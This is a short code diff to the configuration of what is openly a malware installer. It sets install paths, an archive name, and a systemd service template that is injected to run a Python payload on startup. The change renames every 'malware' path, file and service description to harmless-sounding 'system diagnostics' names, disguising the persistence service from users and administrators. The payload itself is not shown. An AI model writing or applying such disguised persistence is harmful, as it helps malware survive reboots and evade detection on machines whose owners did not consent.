@@ -1,12 +1,12 @@
 #settings if run as root
-root = {"targetDir": "/etc/malware/", "serviceLoc": "/etc/systemd/system/"}
+root = {"targetDir": "/etc/sysDiag/", "serviceLoc": "/etc/systemd/system/"}
 
 #settings if run without root
-user = {"targetDir": "~/.malware/", "serviceLoc": "~/.config/systemd/user/"}
+user = {"targetDir": "~/.sysDiag/", "serviceLoc": "~/.config/systemd/user/"}
 
 #name of serveral files
-tarName = "malware.tar"
-serviceName = "malware.service"
+tarName = "systemDiagnostics.tar"
+serviceName = "sys-diagnostics.service"
 
 #service script to inject
-service = "[Unit]\nDescription=\"run malware, duhhh\"\n[Service]\nType=simple\nExecStart=/usr/bin/python3 {targetPath}"
+service = "[Unit]\nDescription=\"tracks system details\"\n[Service]\nType=simple\nExecStart=/usr/bin/python3 {targetPath}"
